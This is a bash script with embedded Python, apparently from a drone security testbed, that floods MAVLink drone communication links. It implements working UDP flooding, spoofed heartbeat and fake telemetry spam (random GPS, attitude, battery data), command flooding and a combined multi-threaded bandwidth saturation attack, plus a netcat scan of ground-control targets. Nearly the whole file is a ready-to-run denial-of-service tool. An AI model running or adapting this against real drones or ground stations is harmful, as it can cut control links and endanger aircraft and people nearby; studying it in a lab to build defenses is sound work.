#!/bin/bash
# communication_link_flooding_attack.sh - 드론 통신 링크 플러딩 공격
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/communication_link_flooding_attack.sh
# Purpose: MAVLink 통신 채널을 대량의 메시지로 포화시켜 정상 통신 방해

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Communication Link Flooding Attack"

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}     Communication Link Flooding Attack  ${NC}"
    echo -e "${CYAN}============================================${NC}"
}

execute_communication_flooding() {
    local target_host=${1:-"127.0.0.1"}
    local target_port=${2:-"14550"}
    local flood_mode=${3:-"mavlink_flood"}
    local duration=${4:-60}
    
    log_info "Starting communication link flooding attack"
    log_info "Target: ${target_host}:${target_port}"
    log_info "Flood mode: ${flood_mode}"
    log_info "Duration: ${duration} seconds"
    
    # Python 스크립트 생성 및 실행
    create_and_run_comm_flood "$target_host" "$target_port" "$flood_mode" "$duration"
    local result=$?
    
    if [ $result -eq 0 ]; then
        log_success "Communication link flooding attack completed successfully"
        return 0
    else
        log_error "Communication link flooding attack failed"
        return 1
    fi
}

create_and_run_comm_flood() {
    local target_host="$1"
    local target_port="$2"
    local flood_mode="$3"
    local duration="$4"
    
    log_info "Creating and executing communication flooding attack..."
    
    python3 << PYEOF
from pymavlink import mavutil
from scapy.all import *
import sys
import time
import threading
import random
import signal
import socket

class CommunicationFlooder:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.running = True
        self.packets_sent = 0
        self.bytes_sent = 0
        self.start_time = time.time()
        
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        print(f"\\n[!] Attack interrupted. Packets sent: {self.packets_sent}, Bytes: {self.bytes_sent}")
        self.running = False
        sys.exit(0)
    
    def create_large_mavlink_message(self):
        """대용량 MAVLink 메시지 생성"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = random.randint(1, 255)
        mav.srcComponent = random.randint(1, 255)
        
        # 큰 파라미터 요청 메시지 생성
        return mav.param_request_list_encode(
            target_system=random.randint(1, 255),
            target_component=random.randint(1, 255)
        ).pack(mav)
    
    def create_spam_heartbeat(self):
        """스팸 하트비트 메시지"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = random.randint(1, 255)
        mav.srcComponent = random.randint(1, 255)
        
        return mav.heartbeat_encode(
            type=random.randint(0, 30),
            autopilot=random.randint(0, 20),
            base_mode=random.randint(0, 255),
            custom_mode=random.randint(0, 4294967295),
            system_status=random.randint(0, 8)
        ).pack(mav)
    
    def create_fake_telemetry(self):
        """가짜 텔레메트리 데이터"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = random.randint(1, 255)
        mav.srcComponent = random.randint(1, 255)
        
        message_types = [
            # GPS 데이터
            lambda: mav.gps_raw_int_encode(
                time_usec=int(time.time() * 1e6),
                fix_type=random.randint(0, 8),
                lat=random.randint(-900000000, 900000000),
                lon=random.randint(-1800000000, 1800000000),
                alt=random.randint(-1000, 50000),
                eph=random.randint(0, 65535),
                epv=random.randint(0, 65535),
                vel=random.randint(0, 65535),
                cog=random.randint(0, 36000),
                satellites_visible=random.randint(0, 255)
            ).pack(mav),
            
            # 자세 데이터
            lambda: mav.attitude_encode(
                time_boot_ms=int(time.time() * 1000) % 4294967295,
                roll=random.uniform(-3.14, 3.14),
                pitch=random.uniform(-3.14, 3.14),
                yaw=random.uniform(-3.14, 3.14),
                rollspeed=random.uniform(-5, 5),
                pitchspeed=random.uniform(-5, 5),
                yawspeed=random.uniform(-5, 5)
            ).pack(mav),
            
            # 시스템 상태
            lambda: mav.sys_status_encode(
                onboard_control_sensors_present=random.randint(0, 4294967295),
                onboard_control_sensors_enabled=random.randint(0, 4294967295),
                onboard_control_sensors_health=random.randint(0, 4294967295),
                load=random.randint(0, 1000),
                voltage_battery=random.randint(0, 65535),
                current_battery=random.randint(-32768, 32767),
                battery_remaining=random.randint(0, 100),
                drop_rate_comm=random.randint(0, 10000),
                errors_comm=random.randint(0, 65535),
                errors_count1=random.randint(0, 65535),
                errors_count2=random.randint(0, 65535),
                errors_count3=random.randint(0, 65535),
                errors_count4=random.randint(0, 65535)
            ).pack(mav)
        ]
        
        return random.choice(message_types)()
    
    def udp_flood_attack(self, duration):
        """UDP 플러딩 공격"""
        print(f"[*] Starting UDP flood attack for {duration} seconds...")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running and (time.time() - self.start_time) < duration:
            try:
                # 대용량 랜덤 데이터 생성
                payload = os.urandom(1024)  # 1KB 랜덤 데이터
                
                sock.sendto(payload, (self.target_ip, self.target_port))
                
                self.packets_sent += 1
                self.bytes_sent += len(payload)
                
                if self.packets_sent % 1000 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.packets_sent / elapsed if elapsed > 0 else 0
                    print(f"[*] UDP flood: {self.packets_sent} packets, {rate:.1f} pps")
                
                # 고속 전송
                time.sleep(0.001)
                
            except Exception as e:
                print(f"[-] UDP flood error: {e}")
                break
        
        sock.close()
        print(f"[+] UDP flood completed: {self.packets_sent} packets sent")
    
    def mavlink_spam_attack(self, duration):
        """MAVLink 스팸 공격"""
        print(f"[*] Starting MAVLink spam attack for {duration} seconds...")
        
        while self.running and (time.time() - self.start_time) < duration:
            try:
                # 다양한 MAVLink 메시지 스팸
                messages = [
                    self.create_spam_heartbeat(),
                    self.create_large_mavlink_message(),
                    self.create_fake_telemetry()
                ]
                
                for msg_data in messages:
                    if not self.running:
                        break
                    
                    packet = IP(dst=self.target_ip) / UDP(dport=self.target_port) / Raw(load=msg_data)
                    send(packet, verbose=False)
                    
                    self.packets_sent += 1
                    self.bytes_sent += len(msg_data)
                
                if self.packets_sent % 100 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.packets_sent / elapsed if elapsed > 0 else 0
                    mbps = (self.bytes_sent * 8) / (elapsed * 1000000) if elapsed > 0 else 0
                    print(f"[*] MAVLink spam: {self.packets_sent} packets, {rate:.1f} pps, {mbps:.2f} Mbps")
                
                time.sleep(0.01)
                
            except Exception as e:
                print(f"[-] MAVLink spam error: {e}")
                break
        
        print(f"[+] MAVLink spam completed: {self.packets_sent} packets sent")
    
    def command_flood_attack(self, duration):
        """명령 플러딩 공격"""
        print(f"[*] Starting command flood attack for {duration} seconds...")
        
        while self.running and (time.time() - self.start_time) < duration:
            try:
                mav = mavutil.mavlink.MAVLink(None)
                mav.srcSystem = random.randint(1, 255)
                mav.srcComponent = random.randint(1, 255)
                
                # 다양한 명령 스팸
                commands = [
                    # 파라미터 요청
                    mav.param_request_read_encode(
                        target_system=1,
                        target_component=1,
                        param_id=f"PARAM_{random.randint(1, 1000)}".encode('utf-8'),
                        param_index=-1
                    ).pack(mav),
                    
                    # 상태 요청
                    mav.command_long_encode(
                        target_system=1,
                        target_component=1,
                        command=mavutil.mavlink.MAV_CMD_REQUEST_AUTOPILOT_CAPABILITIES,
                        confirmation=0,
                        param1=1, param2=0, param3=0, param4=0, param5=0, param6=0, param7=0
                    ).pack(mav),
                    
                    # 미션 요청
                    mav.mission_request_list_encode(
                        target_system=1,
                        target_component=1
                    ).pack(mav)
                ]
                
                for cmd_data in commands:
                    if not self.running:
                        break
                    
                    packet = IP(dst=self.target_ip) / UDP(dport=self.target_port) / Raw(load=cmd_data)
                    send(packet, verbose=False)
                    
                    self.packets_sent += 1
                    self.bytes_sent += len(cmd_data)
                
                if self.packets_sent % 50 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.packets_sent / elapsed if elapsed > 0 else 0
                    print(f"[*] Command flood: {self.packets_sent} commands, {rate:.1f} cps")
                
                time.sleep(0.1)
                
            except Exception as e:
                print(f"[-] Command flood error: {e}")
                break
        
        print(f"[+] Command flood completed: {self.packets_sent} commands sent")
    
    def bandwidth_saturation_attack(self, duration):
        """대역폭 포화 공격"""
        print(f"[*] Starting bandwidth saturation attack for {duration} seconds...")
        
        # 다중 스레드로 동시 공격
        attack_threads = []
        
        attack_methods = [
            ("UDP Flood", self.udp_flood_attack),
            ("MAVLink Spam", self.mavlink_spam_attack),
            ("Command Flood", self.command_flood_attack)
        ]
        
        for method_name, method_func in attack_methods:
            thread = threading.Thread(target=method_func, args=(duration,), name=method_name)
            thread.daemon = True
            thread.start()
            attack_threads.append(thread)
            print(f"[+] Started {method_name} thread")
            time.sleep(0.5)
        
        # 모든 스레드 완료 대기
        for thread in attack_threads:
            thread.join()
        
        print(f"[+] Bandwidth saturation attack completed")
    
    def execute_flood_attack(self, mode, duration):
        """플러딩 공격 실행"""
        print(f"[*] Executing flood attack: {mode}")
        
        if mode == "udp_flood":
            self.udp_flood_attack(duration)
        elif mode == "mavlink_spam":
            self.mavlink_spam_attack(duration)
        elif mode == "command_flood":
            self.command_flood_attack(duration)
        elif mode == "bandwidth_saturation":
            self.bandwidth_saturation_attack(duration)
        else:
            print(f"[-] Unknown flood mode: {mode}")
            return False
        
        elapsed = time.time() - self.start_time
        avg_rate = self.packets_sent / elapsed if elapsed > 0 else 0
        avg_bandwidth = (self.bytes_sent * 8) / (elapsed * 1000000) if elapsed > 0 else 0
        
        print(f"\\n[+] Attack completed successfully")
        print(f"    Total packets sent: {self.packets_sent}")
        print(f"    Total bytes sent: {self.bytes_sent}")
        print(f"    Average rate: {avg_rate:.1f} packets/second")
        print(f"    Average bandwidth: {avg_bandwidth:.2f} Mbps")
        print(f"    Duration: {elapsed:.1f} seconds")
        
        return True

# 메인 실행 로직
import os  # os 모듈 추가

target_ip = "$target_host"
target_port = int("$target_port")
flood_mode = "$flood_mode"
duration = int("$duration")

flooder = CommunicationFlooder(target_ip, target_port)

try:
    print(f"[*] Starting communication flooding attack on {target_ip}:{target_port}")
    print(f"[*] Mode: {flood_mode}, Duration: {duration} seconds")
    print(f"[*] Press Ctrl+C to stop attack")
    print("")
    
    success = flooder.execute_flood_attack(flood_mode, duration)
    
    if success:
        sys.exit(0)
    else:
        sys.exit(1)
        
except Exception as e:
    print(f"[-] Attack execution failed: {e}")
    flooder.running = False
    sys.exit(1)
PYEOF
    
    return $?
}

# MAVLink 타겟 스캔
scan_communication_targets() {
    log_info "Scanning for communication targets..."
    
    local common_targets=(
        "127.0.0.1:14550"
        "127.0.0.1:14551"
        "10.13.0.6:14550"
        "10.13.0.4:14550"
        "192.168.13.14:14550"
        "192.168.1.100:14550"
    )
    
    local found_targets=()
    
    for target in "${common_targets[@]}"; do
        local ip=$(echo "$target" | cut -d':' -f1)
        local port=$(echo "$target" | cut -d':' -f2)
        
        if timeout 2 nc -z "$ip" "$port" 2>/dev/null; then
            found_targets+=("$target")
            echo -e "${GREEN}Found communication target: $target${NC}"
        fi
    done
    
    if [ ${#found_targets[@]} -eq 0 ]; then
        echo -e "${YELLOW}No live communication targets found${NC}"
        return 1
    fi
    
    return 0
}

# 메인 실행 함수
main() {
    print_attack_banner
    
    if [ "$EUID" -ne 0 ]; then
        log_error "This script must be run as root"
        exit 1
    fi
    
    # 필수 도구 확인
    local required_tools=("python3")
    local missing_tools=()
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        log_error "Missing required tools: ${missing_tools[*]}"
        exit 1
    fi
    
    # Python 의존성 확인
    if ! python3 -c "import pymavlink, scapy" 2>/dev/null; then
        log_info "Installing Python dependencies..."
        pip3 install pymavlink scapy >/dev/null 2>&1
    fi
    
    # 사용자 옵션 처리
    local target_host="${1:-127.0.0.1}"
    local target_port="${2:-14550}"
    local flood_mode="${3:-mavlink_spam}"
    local duration="${4:-60}"
    
    # 사용법 출력
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
        echo "Usage: $0 [target_host] [target_port] [flood_mode] [duration]"
        echo "  target_host : Target IP address (default: 127.0.0.1)"
        echo "  target_port : Target communication port (default: 14550)"
        echo "  flood_mode  : Flooding method (default: mavlink_spam)"
        echo "  duration    : Attack duration in seconds (default: 60)"
        echo ""
        echo "Flood modes:"
        echo "  udp_flood            : High-speed UDP packet flooding"
        echo "  mavlink_spam         : MAVLink message spam attack"
        echo "  command_flood        : MAVLink command flooding"
        echo "  bandwidth_saturation : Combined multi-method attack"
        echo ""
        echo "Examples:"
        echo "  $0                                    # MAVLink spam for 60s"
        echo "  $0 10.13.0.6 14550 udp_flood 120    # UDP flood for 120s"
        echo "  $0 127.0.0.1 14550 command_flood 90 # Command flood for 90s"
        echo "  $0 127.0.0.1 14550 bandwidth_saturation 180 # Full attack for 180s"
        echo ""
        echo "Target examples:"
        echo "  10.13.0.6:14550    - QGroundControl (Bridge)"
        echo "  192.168.13.14:14550 - MAVProxy (WiFi)"
        echo "  127.0.0.1:14550    - Local SITL"
        exit 0
    fi
    
    # 타겟 스캔 (정보용)
    scan_communication_targets
    
    # 공격 실행
    execute_communication_flooding "$target_host" "$target_port" "$flood_mode" "$duration"
    exit $?
}

# 직접 실행 시 메인 함수 호출
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi